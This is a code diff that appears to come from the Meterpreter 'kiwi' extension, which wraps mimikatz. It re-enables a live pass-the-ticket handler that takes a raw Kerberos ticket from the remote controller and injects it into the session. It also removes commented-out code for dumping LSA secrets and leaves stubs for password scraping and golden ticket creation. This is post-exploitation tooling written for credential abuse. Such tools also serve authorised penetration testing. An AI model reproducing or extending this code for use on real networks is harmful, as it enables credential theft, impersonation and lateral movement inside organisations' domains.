@@ -15,15 +15,15 @@ EnableDelayLoadMetSrv();
 #include "main.h"
 
 extern __declspec(dllexport) wchar_t * powershell_reflective_mimikatz(LPWSTR input);
+extern DWORD kuhl_m_kerberos_ptt_data(PVOID data, DWORD dataSize);
 extern LONG mimikatz_initOrClean(BOOL Init);
 
 DWORD request_exec_cmd(Remote *remote, Packet *packet);
 //DWORD request_scrape_passwords(Remote *remote, Packet *packet);
 //DWORD request_kerberos_golden_ticket_create(Remote *remote, Packet *packet);
-//DWORD request_kerberos_ticket_use(Remote *remote, Packet *packet);
+DWORD request_kerberos_ticket_use(Remote *remote, Packet *packet);
 //DWORD request_kerberos_ticket_purge(Remote *remote, Packet *packet);
 //DWORD request_kerberos_ticket_list(Remote *remote, Packet *packet);
-//DWORD request_lsa_dump_secrets(Remote *remote, Packet *packet);
 //DWORD request_wifi_profile_list(Remote *remote, Packet *packet);
 
 /*! @brief The enabled commands for this extension. */
@@ -31,11 +31,10 @@ Command customCommands[] =
 {
     COMMAND_REQ("kiwi_exec_cmd", request_exec_cmd),
     //COMMAND_REQ("kiwi_scrape_passwords", request_scrape_passwords),
-    //COMMAND_REQ("kiwi_kerberos_ticket_use", request_kerberos_ticket_use),
+    COMMAND_REQ("kiwi_kerberos_ticket_use", request_kerberos_ticket_use),
     //COMMAND_REQ("kiwi_kerberos_golden_ticket_create", request_kerberos_golden_ticket_create),
     //COMMAND_REQ("kiwi_kerberos_ticket_purge", request_kerberos_ticket_purge),
     //COMMAND_REQ("kiwi_kerberos_ticket_list", request_kerberos_ticket_list),
-    //COMMAND_REQ("kiwi_lsa_dump_secrets", request_lsa_dump_secrets),
     //COMMAND_REQ("kiwi_wifi_profile_list", request_wifi_profile_list),
     COMMAND_TERMINATOR
 };
@@ -82,55 +81,33 @@ DWORD request_exec_cmd(Remote *remote, Packet *packet)
 }
 
 /*!
- * @brief Handler for the lsa dump secrets message.
- * @param remote Pointer to the \c Remote instance.
- * @param packet Pointer to the incoming packet.
- * @returns \c ERROR_SUCCESS
- */
-//DWORD request_lsa_dump_secrets(Remote *remote, Packet *packet)
-//{
-//	DWORD result;
-//	Packet * response = packet_create_response(packet);
-//
-//	dprintf("[KIWI LSA] Dumping LSA Secrets");
-//
-//	result = mimikatz_lsa_dump_secrets(response);
-//
-//	dprintf("[KIWI LSA] Dumped, transmitting response.");
-//	packet_transmit_response(result, remote, response);
-//	dprintf("[KIWI LSA] Done.");
-//
-//	return ERROR_SUCCESS;
-//}
-
-/*!
  * @brief Handler for the use kerberos ticket message.
  * @param remote Pointer to the \c Remote instance.
  * @param packet Pointer to the incoming packet.
  * @returns \c ERROR_SUCCESS
  */
-//DWORD request_kerberos_ticket_use(Remote *remote, Packet *packet)
-//{
-//	Packet * response = packet_create_response(packet);
-//	DWORD result = ERROR_INVALID_PARAMETER;
-//	Tlv ticketTlv;
-//
-//	result = packet_get_tlv(packet, TLV_TYPE_KIWI_KERB_TKT_RAW, &ticketTlv);
-//
-//	if (result == ERROR_SUCCESS)
-//	{
-//		dprintf("[KIWI] Ticket size: %u bytes", ticketTlv.header.length);
-//		result = mimikatz_kerberos_ticket_use(ticketTlv.buffer, ticketTlv.header.length);
-//	}
-//	else
-//	{
-//		dprintf("[KIWI] Failed to get ticket content");
-//	}
-//
-//	packet_transmit_response(result, remote, response);
-//
-//	return result;
-//}
+DWORD request_kerberos_ticket_use(Remote *remote, Packet *packet)
+{
+	Packet * response = packet_create_response(packet);
+	DWORD result = ERROR_INVALID_PARAMETER;
+	Tlv ticketTlv;
+
+	result = packet_get_tlv(packet, TLV_TYPE_KIWI_KERB_TKT_RAW, &ticketTlv);
+
+	if (result == ERROR_SUCCESS)
+	{
+		dprintf("[KIWI] Ticket size: %u bytes", ticketTlv.header.length);
+		result = kuhl_m_kerberos_ptt_data(ticketTlv.buffer, ticketTlv.header.length);
+	}
+	else
+	{
+		dprintf("[KIWI] Failed to get ticket content");
+	}
+
+	packet_transmit_response(result, remote, response);
+
+	return result;
+}
 
 /*!
  * @brief Handler for the create golden kerberos ticket message.
